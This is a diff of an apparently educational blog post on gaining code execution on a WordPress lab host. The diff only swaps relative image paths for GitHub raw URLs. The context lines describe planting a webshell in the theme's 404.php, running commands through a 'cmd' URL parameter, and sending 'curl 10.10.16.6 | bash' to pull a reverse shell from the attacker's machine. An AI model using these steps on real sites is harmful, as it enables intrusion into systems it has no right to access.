@@ -19,13 +19,13 @@ However you can do that with **"wpscan"**, **"wpseku"**, **"WhatWeb"**, and **"W
 
 When you access to the panel as admin, you will see something like this:
 
-<img src="../images/wp-dashboard.png"> 
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-dashboard.png"> 
 
 Now, you have to click on **"Editor"*** --> **"Themes"** --> ***"404.php"**.
 
 And you will see something like that:
 
-<img src="../images/wp-editor.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-editor.png">
 
 Just add your malicious code in the template, in my case a simple webshell.
 
@@ -36,7 +36,7 @@ And click on **"Update file"**.
 
 Go to the edited template (or wherever you've injected your webshell) in my case I go to **http://10.10.10.61/?p=404.php&cmd=whoami**
 
-<img src="../images/wp-rce.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-rce.png">
 
 You'll see the executed command.
 
@@ -60,13 +60,13 @@ So send a request to: http://10.10.10.61/?p=404.php&cmd=curl 10.10.16.6 \| bash
 
 (You need to change the ip of the curl and the ip of the reverse shell.)
 
-<img src="../images/wp-rce2.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-rce2.png">
 
 As I send the request to the webpage, I check the listener and... Voilà.
 The victim sent a request to my index.html and executed it with bash.
 
 I successfully received the shell and I'm on the victim machine.
 
-<img src="../images/wp-shell.png">
+<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/wp-shell.png">
 
 That's all.
